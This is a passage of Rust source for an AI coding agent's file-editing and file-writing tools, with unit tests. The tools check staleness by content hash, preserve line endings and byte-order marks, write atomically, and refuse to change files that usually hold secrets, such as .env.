//! `edit_file` and `write_file`: plan a change without touching the disk,
//! then apply it safely.
//!
//! Planning validates the arguments and computes the new bytes. Applying
//! re-checks the path with `Project::for_write`, re-checks that the file is
//! still as it was read, creates missing folders one at a time without
//! following a link, writes a temporary file beside the target and renames it
//! into place. A folder swapped for a link in the instant between the last
//! check and the rename cannot be ruled out without `openat`-style calls the
//! standard library lacks.
//!
//! Text handling: files are UTF-8. A byte-order mark is kept. The model's
//! `old_text`/`new_text` are LF text (any CR is dropped); the file's own line
//! ending (CRLF when it has more CRLF than bare LF, else LF) is used for the
//! inserted text, and every byte outside the replaced spans stays as it was.
//! `write_file` writes its content exactly as given.
//!
//! Replacing by rename does not keep extended attributes, ACLs or ownership,
//! splits hard links (the new file is a different file), and replaces a
//! read-only file. Every change carries the content it was planned from and
//! is applied only if the target still matches it exactly.

use std::collections::HashMap;
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use serde_json::Value;
use sha2::{Digest, Sha256};
use similar::{ChangeTag, TextDiff};

use super::paths::{InProject, Project, UNUSABLE, invisible};
use super::read::{fail, ok, path_summary, required_str};
use super::secrets::is_secret;
use super::{ToolOutcome, ToolStatus};

/// Largest file `edit_file` accepts, and largest content either tool writes.
const MAX_BYTES: u64 = 1_000_000;
const TOO_BIG: &str = "1,000,000 bytes";
/// Longest card line, in characters.
const MAX_LINE_CHARS: usize = 500;
/// Most changed lines per list.
const MAX_LIST: usize = 200;
/// Lines of a new file shown on the card.
const NEW_FILE_LINES: usize = 40;
/// Most candidate lines searched for the "closest lines" hint.
const MAX_CANDIDATES: usize = 5000;
const SECRET: &str = "That file usually holds secrets, so it cannot be changed here.";
const BOM: &[u8] = b"\xef\xbb\xbf";

/// What the log remembers about one file the model has read.
#[derive(Debug, Clone)]
struct Stamp {
    len: u64,
    modified: Option<SystemTime>,
    /// Absent only for a file too big to edit; present otherwise, so a change
    /// that keeps both length and modified time is still noticed.
    hash: Option<[u8; 32]>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReadState {
    Unread,
    Stale,
    Fresh,
}

/// The files this chat's model has read (or written), by real path.
#[derive(Debug, Default)]
pub struct ReadLog {
    seen: HashMap<PathBuf, Stamp>,
}

fn sha(bytes: &[u8]) -> [u8; 32] {
    Sha256::digest(bytes).into()
}

/// The whole file, or `None` when it cannot be read or is over the limit.
fn read_limited(path: &Path) -> Option<Vec<u8>> {
    let f = fs::File::open(path).ok()?;
    if !f.metadata().ok()?.is_file() {
        return None;
    }
    let mut buf = Vec::new();
    f.take(MAX_BYTES + 1).read_to_end(&mut buf).ok()?;
    (buf.len() as u64 <= MAX_BYTES).then_some(buf)
}

impl ReadLog {
    /// Records the file's current length, modified time and content hash.
    pub fn note_read(&mut self, real: &Path) {
        // Metadata first: a change during the read then shows as stale.
        let Ok(meta) = fs::metadata(real) else {
            self.seen.remove(real);
            return;
        };
        let hash = if meta.len() <= MAX_BYTES {
            match read_limited(real) {
                Some(b) => Some(sha(&b)),
                None => {
                    self.seen.remove(real);
                    return;
                }
            }
        } else {
            None
        };
        self.seen.insert(
            real.to_path_buf(),
            Stamp {
                len: meta.len(),
                modified: meta.modified().ok(),
                hash,
            },
        );
    }

    /// Records a file this module just wrote, from the bytes written.
    fn note_written(&mut self, real: &Path, bytes: &[u8]) {
        match fs::metadata(real) {
            Ok(meta) => {
                self.seen.insert(
                    real.to_path_buf(),
                    Stamp {
                        len: bytes.len() as u64,
                        modified: meta.modified().ok(),
                        hash: Some(sha(bytes)),
                    },
                );
            }
            Err(_) => {
                self.seen.remove(real);
            }
        }
    }

    fn state(&self, real: &Path) -> ReadState {
        let Some(st) = self.seen.get(real) else {
            return ReadState::Unread;
        };
        let Ok(meta) = fs::metadata(real) else {
            return ReadState::Stale;
        };
        if meta.len() != st.len || meta.modified().ok() != st.modified {
            return ReadState::Stale;
        }
        match st.hash {
            Some(h) => match read_limited(real) {
                Some(b) if sha(&b) == h => ReadState::Fresh,
                _ => ReadState::Stale,
            },
            None => ReadState::Fresh,
        }
    }

    /// True when the file is as it was when last read or written here.
    pub fn fresh(&self, real: &Path) -> bool {
        self.state(real) == ReadState::Fresh
    }

    /// `Err(message)` unless the file is fresh.
    fn require_fresh(&self, real: &Path, shown: &str) -> Result<(), String> {
        match self.state(real) {
            ReadState::Fresh => Ok(()),
            ReadState::Unread => Err(format!("Read {shown} first.")),
            ReadState::Stale => Err(format!("{shown} changed since it was read. Read it again.")),
        }
    }
}

/// What a change was planned from: apply writes only if the target is still
/// exactly this.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Base {
    /// The file did not exist.
    Missing,
    /// The file held exactly these bytes.
    Content { len: u64, hash: [u8; 32] },
}

impl Base {
    fn of(bytes: &[u8]) -> Base {
        Base::Content {
            len: bytes.len() as u64,
            hash: sha(bytes),
        }
    }
}

/// A validated change, not yet on disk.
#[derive(Debug, Clone)]
pub struct Change {
    pub project: Project,
    pub target: InProject,
    pub created: bool,
    pub new_bytes: Vec<u8>,
    /// Changed lines for the card: no line endings, control and format
    /// characters written as visible escapes, each cut to 500 characters
    /// plus a marker saying how much is hidden, each list at most 200 lines.
    /// For a created file `added` is its first 40 lines.
    pub removed: Vec<String>,
    pub added: Vec<String>,
    pub total_lines: u32,
    /// The true counts behind the (possibly cut) lists.
    pub removed_total: u32,
    pub added_total: u32,
    /// The content this change was computed from.
    pub base: Base,
}

/// `kind`: `Some(true)` a creation, `Some(false)` a change to an existing
/// file, `None` not known (a `write_file` refused before the file was seen).
fn refusal(text: impl Into<String>, kind: Option<bool>) -> ToolOutcome {
    let summary = match kind {
        Some(true) => "Created a file",
        Some(false) => "Edited a file",
        None => "Wrote a file",
    };
    fail(text.into(), summary.to_string())
}

fn target_of(project: &Project, path: &str, kind: Option<bool>) -> Result<InProject, ToolOutcome> {
    let target = project.for_write(path).map_err(|e| refusal(e, kind))?;
    if is_secret(&target.shown) {
        return Err(refusal(SECRET, kind));
    }
    Ok(target)
}

fn exists(real: &Path) -> bool {
    fs::symlink_metadata(real).is_ok()
}

/// A file's text, with the byte-order mark set aside.
struct Doc<'a> {
    bom: bool,
    text: &'a str,
}

fn decode(bytes: &[u8]) -> Option<Doc<'_>> {
    if bytes.contains(&0) {
        return None;
    }
    let (bom, rest) = match bytes.strip_prefix(BOM) {
        Some(r) => (true, r),
        None => (false, bytes),
    };
    Some(Doc {
        bom,
        text: std::str::from_utf8(rest).ok()?,
    })
}

/// The text with each CRLF folded to LF (a lone CR stays), and the folded
/// index of every folded line feed that was a CRLF.
fn fold(text: &str) -> (String, Vec<usize>) {
    let mut out = String::with_capacity(text.len());
    let mut crlf = Vec::new();
    let mut rest = text;
    while let Some(i) = rest.find("\r\n") {
        out.push_str(&rest[..i]);
        crlf.push(out.len());
        out.push('\n');
        rest = &rest[i + 2..];
    }
    out.push_str(rest);
    (out, crlf)
}

/// CRLF when the text has at least one CRLF and more CRLF than bare LF.
fn uses_crlf(text: &str, crlf_count: usize) -> bool {
    let bare = text.matches('\n').count() - crlf_count;
    crlf_count > 0 && crlf_count > bare
}

/// Byte offset in the original of a folded offset.
fn unfold_at(crlf: &[usize], folded_at: usize) -> usize {
    folded_at + crlf.partition_point(|&i| i < folded_at)
}

/// Non-overlapping ranges of `needle`.
fn exact_ranges(text: &str, needle: &str) -> Vec<(usize, usize)> {
    text.match_indices(needle)
        .map(|(i, m)| (i, i + m.len()))
        .collect()
}

fn loose_trim(s: &str) -> &str {
    s.trim_end_matches([' ', '\t', '\r'])
}

/// Ranges of whole lines of `text` equal to the lines of `old`, ignoring
/// trailing spaces, tabs and CRs on each line. A match runs from the start of
/// its first line to the end of its last line's content (its trailing white
/// space included), or through that line's terminator when `old` ends with a
/// newline. Never used for a blank `old`.
fn loose_ranges(text: &str, old: &str) -> Vec<(usize, usize)> {
    if old.trim().is_empty() {
        return Vec::new();
    }
    let ends_nl = old.ends_with('\n');
    let body = old.strip_suffix('\n').unwrap_or(old);
    let want: Vec<&str> = body.split('\n').map(loose_trim).collect();
    // (start, end of content, end with terminator, comparable part)
    let mut lines = Vec::new();
    let mut start = 0;
    for piece in text.split_inclusive('\n') {
        let content = piece.strip_suffix('\n').unwrap_or(piece);
        lines.push((
            start,
            start + content.len(),
            start + piece.len(),
            loose_trim(content),
        ));
        start += piece.len();
    }
    let mut found = Vec::new();
    if want.len() > lines.len() {
        return found;
    }
    for i in 0..=lines.len() - want.len() {
        if want.iter().enumerate().all(|(j, w)| lines[i + j].3 == *w) {
            let last = lines[i + want.len() - 1];
            found.push((lines[i].0, if ends_nl { last.2 } else { last.1 }));
        }
    }
    found
}

/// A line made safe to show a person: control characters other than tab and
/// invisible or direction-changing ones become `\u{..}` (a carriage return
/// `\r`); cut at 500 characters with a marker saying how many were hidden.
/// What is written to disk is never touched by this.
fn show(line: &str) -> String {
    let line = line.strip_suffix('\n').unwrap_or(line);
    let line = line.strip_suffix('\r').unwrap_or(line);
    let mut out = String::new();
    let mut shown = 0usize;
    let mut hidden = 0usize;
    for c in line.chars() {
        let piece = if c == '\t' {
            "\t".to_string()
        } else if c == '\r' {
            "\\r".to_string()
        } else if c.is_control() || invisible(c) {
            format!("\\u{{{:X}}}", c as u32)
        } else {
            c.to_string()
        };
        let n = piece.chars().count();
        if hidden == 0 && shown + n <= MAX_LINE_CHARS {
            out.push_str(&piece);
            shown += n;
        } else {
            hidden += n;
        }
    }
    if hidden > 0 {
        out.push_str(&format!("… [{hidden} more characters]"));
    }
    out
}

/// Removed and added lines between two texts: (removed, added, true counts).
fn diff_lines(old: &str, new: &str) -> (Vec<String>, Vec<String>, u32, u32) {
    let diff = TextDiff::from_lines(old, new);
    let (mut removed, mut added) = (Vec::new(), Vec::new());
    let (mut rn, mut an) = (0u32, 0u32);
    for c in diff.iter_all_changes() {
        match c.tag() {
            ChangeTag::Delete => {
                rn += 1;
                if removed.len() < MAX_LIST {
                    removed.push(show(c.value()));
                }
            }
            ChangeTag::Insert => {
                an += 1;
                if added.len() < MAX_LIST {
                    added.push(show(c.value()));
                }
            }
            ChangeTag::Equal => {}
        }
    }
    (removed, added, rn, an)
}

fn line_count(text: &str) -> u32 {
    text.lines().count().min(u32::MAX as usize) as u32
}

/// Up to three lines of `text` most like the first non-blank line of `old`.
fn closest_lines(text: &str, old: &str) -> String {
    let Some(word) = old.lines().map(str::trim).find(|l| !l.is_empty()) else {
        return String::new();
    };
    let word: String = word.chars().take(200).collect();
    let cands: Vec<(usize, String)> = text
        .lines()
        .enumerate()
        .map(|(i, l)| (i + 1, l.trim().chars().take(200).collect::<String>()))
        .filter(|(_, l)| !l.is_empty())
        .take(MAX_CANDIDATES)
        .collect();
    let refs: Vec<&str> = cands.iter().map(|(_, l)| l.as_str()).collect();
    let mut used = vec![false; cands.len()];
    let mut out = String::new();
    for m in similar::get_close_matches::<str>(word.as_str(), &refs, 3, 0.3) {
        if let Some(i) = (0..cands.len()).find(|&i| !used[i] && cands[i].1 == m) {
            used[i] = true;
            out.push_str(&format!("\n{}: {}", cands[i].0, show(m)));
        }
    }
    if out.is_empty() {
        out
    } else {
        format!("\nClosest lines in the file:{out}")
    }
}

fn replace_all_flag(args: &Value) -> Result<bool, String> {
    match args.get("replace_all") {
        None | Some(Value::Null) => Ok(false),
        Some(Value::Bool(b)) => Ok(*b),
        Some(_) => Err("The argument \"replace_all\" must be true or false.".to_string()),
    }
}

fn too_big_to_edit(shown: &str) -> String {
    format!("{shown} is larger than {TOO_BIG}, so it cannot be edited here.")
}

pub fn plan_edit(project: &Project, log: &ReadLog, args: &Value) -> Result<Change, ToolOutcome> {
    let kind = Some(false);
    let args_err = |e: String| refusal(e, kind);
    let path = required_str(args, "path").map_err(args_err)?;
    let old = required_str(args, "old_text").map_err(args_err)?;
    let new = required_str(args, "new_text").map_err(args_err)?;
    let all = replace_all_flag(args).map_err(args_err)?;
    // The model's text is LF by definition.
    let old = old.replace('\r', "");
    let new = new.replace('\r', "");
    if old.is_empty() {
        return Err(refusal(
            "The argument \"old_text\" must not be empty. Use write_file to create a file.",
            kind,
        ));
    }
    if old == new {
        return Err(refusal(
            "old_text and new_text are the same, so nothing would change.",
            kind,
        ));
    }
    let target = target_of(project, path, kind)?;
    let shown = target.shown.clone();
    let meta = match fs::symlink_metadata(&target.real) {
        Ok(m) if m.is_file() => m,
        Ok(_) => return Err(refusal(UNUSABLE, kind)),
        Err(_) => {
            return Err(refusal(
                format!("{shown} does not exist. Use write_file to create it."),
                kind,
            ));
        }
    };
    if meta.len() > MAX_BYTES {
        return Err(refusal(too_big_to_edit(&shown), kind));
    }
    log.require_fresh(&target.real, &shown)
        .map_err(|e| refusal(e, kind))?;
    let bytes = read_limited(&target.real).ok_or_else(|| refusal(too_big_to_edit(&shown), kind))?;
    // Still what the model read?
    log.require_fresh(&target.real, &shown)
        .map_err(|e| refusal(e, kind))?;
    let doc = decode(&bytes).ok_or_else(|| {
        refusal(
            format!("{shown} is not UTF-8 text, so it cannot be edited here."),
            kind,
        )
    })?;

    let (folded, crlf) = fold(doc.text);
    let file_crlf = uses_crlf(doc.text, crlf.len());
    let mut ranges = exact_ranges(&folded, &old);
    let n = ranges.len();
    if n > 1 && !all {
        return Err(refusal(
            format!(
                "old_text occurs {n} times in {shown}. Add more surrounding text or set replace_all."
            ),
            kind,
        ));
    }
    if n == 0 {
        let loose = loose_ranges(&folded, &old);
        match loose.as_slice() {
            [one] => ranges = vec![*one],
            [] => {
                return Err(refusal(
                    format!(
                        "old_text was not found in {shown}.{}",
                        closest_lines(&folded, &old)
                    ),
                    kind,
                ));
            }
            many => {
                return Err(refusal(
                    format!(
                        "old_text was not found exactly in {shown}; ignoring trailing spaces it occurs {} times. Add more surrounding text.",
                        many.len()
                    ),
                    kind,
                ));
            }
        }
    }
    // Replace in the original text, so every byte outside the spans stays.
    let replacement = if file_crlf {
        new.replace('\n', "\r\n")
    } else {
        new
    };
    let mut out = String::with_capacity(doc.text.len());
    let mut at = 0;
    for (s, e) in &ranges {
        let (rs, re) = (unfold_at(&crlf, *s), unfold_at(&crlf, *e));
        out.push_str(&doc.text[at..rs]);
        out.push_str(&replacement);
        at = re;
    }
    out.push_str(&doc.text[at..]);
    if out == doc.text {
        return Err(refusal("That edit would not change the file.", kind));
    }
    let mut new_bytes = Vec::with_capacity(out.len() + 3);
    if doc.bom {
        new_bytes.extend_from_slice(BOM);
    }
    new_bytes.extend_from_slice(out.as_bytes());
    if new_bytes.len() as u64 > MAX_BYTES {
        return Err(refusal(
            format!("The edited file would be larger than {TOO_BIG}, so it cannot be written."),
            kind,
        ));
    }
    let new_folded = fold(&out).0;
    let (removed, added, removed_total, added_total) = diff_lines(&folded, &new_folded);
    Ok(Change {
        project: project.clone(),
        target,
        created: false,
        new_bytes,
        removed,
        added,
        total_lines: line_count(&new_folded),
        removed_total,
        added_total,
        base: Base::of(&bytes),
    })
}

pub fn plan_write(project: &Project, log: &ReadLog, args: &Value) -> Result<Change, ToolOutcome> {
    let args_err = |e: String| refusal(e, None);
    let path = required_str(args, "path").map_err(args_err)?;
    let content = required_str(args, "content").map_err(args_err)?;
    if content.len() as u64 > MAX_BYTES {
        return Err(refusal(
            format!("The content is larger than {TOO_BIG}, so it cannot be written."),
            None,
        ));
    }
    let target = target_of(project, path, None)?;
    let created = !exists(&target.real);
    let kind = Some(created);
    let (removed, added, removed_total, added_total, base);
    if created {
        removed = Vec::new();
        added = content.lines().take(NEW_FILE_LINES).map(show).collect();
        removed_total = 0;
        added_total = line_count(content);
        base = Base::Missing;
    } else {
        let shown = &target.shown;
        log.require_fresh(&target.real, shown)
            .map_err(|e| refusal(e, kind))?;
        let unshowable = || {
            refusal(
                format!("{shown} is too large or is not text, so it cannot be replaced here."),
                kind,
            )
        };
        let bytes = read_limited(&target.real).ok_or_else(unshowable)?;
        log.require_fresh(&target.real, shown)
            .map_err(|e| refusal(e, kind))?;
        let old = decode(&bytes).ok_or_else(unshowable)?;
        if bytes == content.as_bytes() {
            return Err(refusal(
                format!("{shown} already has exactly that content."),
                kind,
            ));
        }
        (removed, added, removed_total, added_total) = diff_lines(old.text, content);
        base = Base::of(&bytes);
    }
    Ok(Change {
        project: project.clone(),
        target,
        created,
        new_bytes: content.as_bytes().to_vec(),
        removed,
        added,
        total_lines: line_count(content),
        removed_total,
        added_total,
        base,
    })
}

/// Removes the temporary file unless it was moved into place.
struct TempGuard(PathBuf);

impl Drop for TempGuard {
    fn drop(&mut self) {
        let _ = fs::remove_file(&self.0);
    }
}

fn is_real_dir(p: &Path) -> bool {
    fs::symlink_metadata(p).is_ok_and(|m| m.is_dir() && !m.file_type().is_symlink())
}

/// Creates the folders above `file` that do not exist, one at a time, each
/// checked to be a real directory (not a link) before going on.
fn make_parents(root: &Path, file: &Path) -> Result<(), String> {
    let rel = file
        .parent()
        .and_then(|p| p.strip_prefix(root).ok())
        .ok_or_else(|| UNUSABLE.to_string())?;
    let mut cur = root.to_path_buf();
    for comp in rel.components() {
        cur.push(comp);
        match fs::symlink_metadata(&cur) {
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => match fs::create_dir(&cur) {
                Ok(()) => {}
                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {}
                Err(e) => return Err(format!("Could not create a folder: {e}")),
            },
            Err(_) => return Err(UNUSABLE.to_string()),
        }
        if !is_real_dir(&cur) {
            return Err(UNUSABLE.to_string());
        }
    }
    Ok(())
}

/// Creates `real` (which must not exist) and copies `bytes` in; a partial
/// file is removed on failure.
fn create_by_copy(real: &Path, bytes: &[u8], shown: &str) -> Result<(), String> {
    let mut f = match fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(real)
    {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
            return Err(format!("{shown} already exists. Read it first."));
        }
        Err(e) => return Err(format!("Could not write the file: {e}")),
    };
    let done = f
        .write_all(bytes)
        .and_then(|_| f.flush())
        .and_then(|_| f.sync_all());
    drop(f);
    if let Err(e) = done {
        let _ = fs::remove_file(real);
        return Err(format!("Could not write the file: {e}"));
    }
    Ok(())
}

fn write_temp_and_place(change: &Change, real: &Path) -> Result<(), String> {
    let dir = real.parent().ok_or_else(|| UNUSABLE.to_string())?;
    let tmp = dir.join(format!(".beluga-{}.tmp", uuid::Uuid::new_v4().simple()));
    let io = |e: std::io::Error| format!("Could not write the file: {e}");
    let mut opts = fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    if !change.created {
        // Private until it gets the target's mode, just before the rename.
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut f = opts.open(&tmp).map_err(io)?;
    let _guard = TempGuard(tmp.clone());
    f.write_all(&change.new_bytes).map_err(io)?;
    f.flush().map_err(io)?;
    f.sync_all().map_err(io)?;
    drop(f);
    if change.created {
        // Never replace a file that appeared since the check.
        match fs::hard_link(&tmp, real) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                return Err(format!(
                    "{} already exists. Read it first.",
                    change.target.shown
                ));
            }
            Err(_) => create_by_copy(real, &change.new_bytes, &change.target.shown)?,
        }
    } else {
        #[cfg(unix)]
        {
            let perms = fs::metadata(real).map_err(io)?.permissions();
            fs::set_permissions(&tmp, perms).map_err(io)?;
        }
        fs::rename(&tmp, real).map_err(io)?;
    }
    Ok(())
}

/// Whether the target is still exactly what the change was planned from.
fn base_holds(change: &Change, real: &Path) -> Result<(), String> {
    let shown = &change.target.shown;
    match &change.base {
        Base::Missing => {
            if exists(real) {
                return Err(format!("{shown} already exists. Read it first."));
            }
        }
        Base::Content { len, hash } => {
            let same =
                read_limited(real).is_some_and(|b| b.len() as u64 == *len && sha(&b) == *hash);
            if !same {
                return Err(format!(
                    "{shown} changed since this change was prepared. Read it again."
                ));
            }
        }
    }
    Ok(())
}

pub fn apply(change: &Change, log: &mut ReadLog) -> ToolOutcome {
    let shown = &change.target.shown;
    let real = &change.target.real;
    let bad = |m: String| refusal(m, Some(change.created));
    match change.project.for_write(shown) {
        Ok(t) if t.real == *real => {}
        Ok(_) => return bad(UNUSABLE.to_string()),
        Err(e) => return bad(e),
    }
    if is_secret(shown) {
        return bad(SECRET.to_string());
    }
    if let Err(e) = make_parents(&change.project.root, real) {
        return bad(e);
    }
    // Folders were just created: check the whole path once more, then the
    // content, as close to the write as possible.
    match change.project.for_write(shown) {
        Ok(t) if t.real == *real => {}
        Ok(_) => return bad(UNUSABLE.to_string()),
        Err(e) => return bad(e),
    }
    if let Err(e) = base_holds(change, real) {
        return bad(e);
    }
    if let Err(e) = write_temp_and_place(change, real) {
        return bad(e);
    }
    log.note_written(real, &change.new_bytes);

    let mut detail = String::new();
    for l in &change.removed {
        detail.push_str(&format!("-{l}\n"));
    }
    if change.removed_total as usize > change.removed.len() {
        detail.push_str(&format!(
            "... {} more removed\n",
            change.removed_total as usize - change.removed.len()
        ));
    }
    for l in &change.added {
        detail.push_str(&format!("+{l}\n"));
    }
    if change.added_total as usize > change.added.len() {
        detail.push_str(&format!(
            "... {} more added\n",
            change.added_total as usize - change.added.len()
        ));
    }
    let (text, summary) = if change.created {
        (
            format!("Created {shown} ({} lines).", change.total_lines),
            format!("Created {}", path_summary(shown)),
        )
    } else {
        let (a, r) = (change.added_total, change.removed_total);
        (
            format!("Edited {shown} (+{a} \u{2212}{r})."),
            format!("Edited {} (+{a} \u{2212}{r})", path_summary(shown)),
        )
    };
    let mut out = ok(text, summary);
    out.status = ToolStatus::Ok;
    out.detail = Some(detail);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::ToolStatus;
    use serde_json::json;
    use std::fs;

    fn setup() -> (tempfile::TempDir, Project, ReadLog) {
        let d = tempfile::tempdir().unwrap();
        let p = Project::open(d.path().to_str().unwrap()).unwrap();
        (d, p, ReadLog::default())
    }

    /// Writes a file and records it as read.
    fn seed(d: &tempfile::TempDir, p: &Project, l: &mut ReadLog, name: &str, bytes: &[u8]) {
        let f = d.path().join(name);
        fs::create_dir_all(f.parent().unwrap()).unwrap();
        fs::write(&f, bytes).unwrap();
        l.note_read(&p.existing(name).unwrap().real);
    }

    fn edit(
        p: &Project,
        l: &ReadLog,
        path: &str,
        old: &str,
        new: &str,
    ) -> Result<Change, ToolOutcome> {
        plan_edit(
            p,
            l,
            &json!({"path": path, "old_text": old, "new_text": new}),
        )
    }

    fn err_text(r: Result<Change, ToolOutcome>) -> String {
        let o = r.expect_err("expected a refusal");
        assert_eq!(o.status, ToolStatus::Error);
        o.text
    }

    fn do_edit(
        d: &tempfile::TempDir,
        p: &Project,
        l: &mut ReadLog,
        name: &str,
        old: &str,
        new: &str,
    ) -> Vec<u8> {
        let c = edit(p, l, name, old, new).unwrap();
        let o = apply(&c, l);
        assert_eq!(o.status, ToolStatus::Ok, "{}", o.text);
        fs::read(d.path().join(name)).unwrap()
    }

    #[test]
    fn unique_match_is_replaced_and_the_rest_is_byte_identical() {
        let (d, p, mut l) = setup();
        seed(
            &d,
            &p,
            &mut l,
            "a.txt",
            b"one\ntwo\nthree\n\xc3\xa9 \t end\n",
        );
        let got = do_edit(&d, &p, &mut l, "a.txt", "two", "2\n2b");
        assert_eq!(got, b"one\n2\n2b\nthree\n\xc3\xa9 \t end\n");
    }

    #[test]
    fn summary_counts_and_detail() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"a\nb\nc\n");
        let c = edit(&p, &l, "a.txt", "b", "x\ny").unwrap();
        assert_eq!(
            (c.removed.clone(), c.added.clone()),
            (
                vec!["b".to_string()],
                vec!["x".to_string(), "y".to_string()]
            )
        );
        assert_eq!(c.total_lines, 4);
        let o = apply(&c, &mut l);
        assert_eq!(o.summary, "Edited a.txt (+2 \u{2212}1)");
        let detail = o.detail.unwrap();
        assert!(detail.contains("-b") && detail.contains("+x") && detail.contains("+y"));
    }

    #[test]
    fn not_found_names_the_closest_lines_and_several_matches_are_counted() {
        let (d, p, mut l) = setup();
        seed(
            &d,
            &p,
            &mut l,
            "a.txt",
            b"let value = 1;\nlet other = 2;\nlet value = 1;\n",
        );
        let t = err_text(edit(&p, &l, "a.txt", "let valve = 1;", "x"));
        assert!(t.starts_with("old_text was not found in a.txt."), "{t}");
        assert!(t.contains("let value = 1;"), "{t}");
        let t = err_text(edit(&p, &l, "a.txt", "let value = 1;", "x"));
        assert_eq!(
            t,
            "old_text occurs 2 times in a.txt. Add more surrounding text or set replace_all."
        );
        let c = plan_edit(
            &p,
            &l,
            &json!({"path":"a.txt","old_text":"let value = 1;","new_text":"V","replace_all":true}),
        )
        .unwrap();
        assert_eq!(apply(&c, &mut l).status, ToolStatus::Ok);
        assert_eq!(
            fs::read(d.path().join("a.txt")).unwrap(),
            b"V\nlet other = 2;\nV\n"
        );
    }

    #[test]
    fn replace_all_with_no_match_is_still_not_found() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"abc\n");
        let r = plan_edit(
            &p,
            &l,
            &json!({"path":"a.txt","old_text":"zzz","new_text":"y","replace_all":true}),
        );
        assert!(err_text(r).starts_with("old_text was not found in a.txt."));
    }

    #[test]
    fn overlapping_matches_count_as_several() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"aaa");
        assert_eq!(do_edit(&d, &p, &mut l, "a.txt", "aa", "b"), b"ba");
        seed(&d, &p, &mut l, "b.txt", b"aaaa");
        assert!(err_text(edit(&p, &l, "b.txt", "aa", "b")).contains("occurs 2 times"));
    }

    #[test]
    fn empty_and_unchanged_old_text_are_errors() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"abc\n");
        assert!(err_text(edit(&p, &l, "a.txt", "", "x")).contains("old_text"));
        assert!(err_text(edit(&p, &l, "a.txt", "abc", "abc")).contains("same"));
        let r = plan_edit(&p, &l, &json!({"path":"a.txt","old_text":"abc"}));
        assert!(err_text(r).contains("new_text"));
    }

    #[test]
    fn unread_and_stale_files_are_refused() {
        let (d, p, mut l) = setup();
        fs::write(d.path().join("a.txt"), "abc\n").unwrap();
        assert_eq!(
            err_text(edit(&p, &l, "a.txt", "abc", "x")),
            "Read a.txt first."
        );
        l.note_read(&p.existing("a.txt").unwrap().real);
        fs::write(d.path().join("a.txt"), "abcd\n").unwrap();
        assert_eq!(
            err_text(edit(&p, &l, "a.txt", "abc", "x")),
            "a.txt changed since it was read. Read it again."
        );
    }

    #[test]
    fn a_same_length_change_with_the_same_mtime_is_still_stale() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"abc\n");
        let f = d.path().join("a.txt");
        let m = fs::metadata(&f).unwrap().modified().unwrap();
        fs::write(&f, "xyz\n").unwrap();
        fs::File::options()
            .write(true)
            .open(&f)
            .unwrap()
            .set_modified(m)
            .unwrap();
        assert!(!l.fresh(&p.existing("a.txt").unwrap().real));
    }

    #[test]
    fn crlf_is_kept_bom_is_kept_and_no_final_newline_stays_none() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "c.txt", b"a\r\nb\r\nc\r\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "c.txt", "a\nb", "a\nB\nB2"),
            b"a\r\nB\r\nB2\r\nc\r\n"
        );
        seed(&d, &p, &mut l, "n.txt", b"a\nb");
        assert_eq!(do_edit(&d, &p, &mut l, "n.txt", "b", "c"), b"a\nc");
        seed(&d, &p, &mut l, "b.txt", b"\xef\xbb\xbfa\r\nb\r\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "b.txt", "b", "z"),
            b"\xef\xbb\xbfa\r\nz\r\n"
        );
    }

    #[test]
    fn mixed_line_endings_are_not_rewritten() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "m.txt", b"a\r\nb\nc\r\n");
        assert_eq!(do_edit(&d, &p, &mut l, "m.txt", "c", "d"), b"a\r\nb\nd\r\n");
    }

    #[test]
    fn trailing_space_differences_match_loosely_only_when_unique() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"foo\nbar\nbaz\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "a.txt", "foo  \nbar  ", "X"),
            b"X\nbaz\n"
        );
        seed(&d, &p, &mut l, "b.txt", b"foo\nbar\nfoo\nbar\n");
        let t = err_text(edit(&p, &l, "b.txt", "foo  \nbar  ", "X"));
        assert!(t.contains("2 times"), "{t}");
    }

    #[test]
    fn binary_invalid_utf8_and_large_files_are_refused_for_edit() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "zero.bin", b"ab\0cd");
        seed(&d, &p, &mut l, "bad.txt", b"ab\xffcd");
        seed(&d, &p, &mut l, "big.txt", &vec![b'a'; 1_000_001]);
        for n in ["zero.bin", "bad.txt", "big.txt"] {
            let t = err_text(edit(&p, &l, n, "a", "b"));
            assert!(t.contains("cannot be edited"), "{n}: {t}");
        }
    }

    #[test]
    fn an_edit_that_grows_past_the_limit_is_refused() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"abc");
        let big = "x".repeat(1_000_001);
        assert!(err_text(edit(&p, &l, "a.txt", "abc", &big)).contains("1,000,000"));
    }

    #[test]
    fn missing_file_and_secret_files_are_refused() {
        let (d, p, mut l) = setup();
        assert!(err_text(edit(&p, &l, "no.txt", "a", "b")).contains("write_file"));
        seed(&d, &p, &mut l, ".env", b"KEY=1\n");
        seed(&d, &p, &mut l, ".git/config", b"x\n");
        let msg = "That file usually holds secrets, so it cannot be changed here.";
        assert_eq!(err_text(edit(&p, &l, ".env", "1", "2")), msg);
        assert_eq!(err_text(edit(&p, &l, ".git/config", "x", "y")), msg);
